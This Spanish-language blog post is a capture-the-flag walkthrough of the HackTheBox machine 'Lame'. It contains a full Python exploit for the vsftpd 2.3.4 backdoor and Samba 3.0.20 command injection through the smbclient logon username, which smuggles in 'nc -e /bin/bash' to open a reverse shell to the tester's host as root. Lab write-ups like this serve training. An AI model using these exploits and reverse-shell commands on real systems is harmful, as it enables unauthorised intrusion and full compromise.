---
layout: post
title: HTB_Lame
date: 2023/07/10
slug: HTB_Lame
heroImage: /assets/machines.jpg
---

# Lame {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se llama Lame.

El replay del live se puede ver aqui

[![S4vitaar Lame maquina](https://img.youtube.com/vi/MNJi4k9uNKQ/0.jpg)](https://www.youtube.com/watch?v=MNJi4k9uNKQ)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.3
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.3
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,139,445,3632 10.10.10.3 -oN targeted
```


| Puerto | Servicio | Que se nos occure?          | Que falta?           |
| ------ | -------- | --------------------------- | -------------------- |
| 21     | ftp      | Conexion como Anonymous     |                      |
| 22     | ssh      | Conneccion directa          | usuario y contraseña |
| 139    | smbd     | Conneccion con Null session |                      |
| 445    | smbd     | Conneccion con Null session |                      |
| 3632   | distccd  | Web, Fuzzing                |                      |



### Conexion Anonymous con ftp {-}

```bash
ftp 10.10.10.3

Name: anonymous
Password: 

Login successful

ls
```

Podemos connectar como anonymous pero no nos reporta nada. El resultado de nmap nos da que el vsftpd es de version 2.3.4.


## Vulnerability Assessment {-}

### vsftpd 2.3.4 {-}

Miramos si existe un exploit para este servicio.

```bash
searchsploit vsftpd 2.3.4
```

Vemos que hay una vulnerabilidad y que existe un exploit. Como el exploit es une exploit Metasploit, vamos buscando por
la web si existe otro exploit y la encontramos en [cherrera0001 github](https://github.com/cherrera0001/vsftpd_2.3.4_Exploit).

```python
#!/usr/bin/python3
from pwn import log,remote
from sys import argv,exit
from time import sleep

if len(argv) < 2:
    exit(f'Usage: {argv[0]} Target_IP')


p = log.progress("Running")
vsftpd = remote(argv[1], 21)

p.status('Checking Version')
recv = vsftpd.recvuntil(")",timeout=5)
version = (recv.decode()).split(" ")[2].replace(")","")
if version != '2.3.4':
	exit('2.3.4 Version Not Found')

vsftpd.sendline('USER hii:)')
vsftpd.sendline('PASS hello')
p.status('Backdoor Activated')

sleep(3)

backdoor = remote(argv[1], 6200)
p.success("Got Shell!!!")
backdoor.interactive()
```

Si lanzamos el script no funcciona, parece ser que la version a sido parcheada -> rabbithole. 

### SAMBA 3.0.20 {-}

```bash
searchsploit samba 3.0.20
```

Vemos que hay un exploit para Metasploit que permite ejecutar commandos. Examinamos el script con el commando 
```bash
 searchsploit -x 16320 
```
 y vemos
que podemos injectar commandos desde el nombre de usuario con el formato siguiente

```ruby
username = "/=
```bash
 nohup " + payload.encoded + " 
```
"
```

Vamos a por pruebas

1. Nos ponemos en escucha de trazas ICMP

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. Intentamos enviar commandos siguiendo la guia del script

    ```bash
    smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c "dir"
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1"
    smb: \> logon "/='nohup ping -c 1 10.10.14.7'"
    ```

Vemos que esto functionna perfectamente. Vamos a ganar accesso al systema.
## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la vulnerabilidad SAMBA 3.0.20 {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Intentamos enviar commandos siguiendo la guia del script

    ```bash
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=
```bash
 nohup nc -e /bin/bash 10.10.14.7 443 
```
"'
    ```

Hemos ganado accesso al systema.


### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a 
```bash
 whoami 
```
 vemos que ya estamos root ;) No se necessita escalar privilegios en este caso.
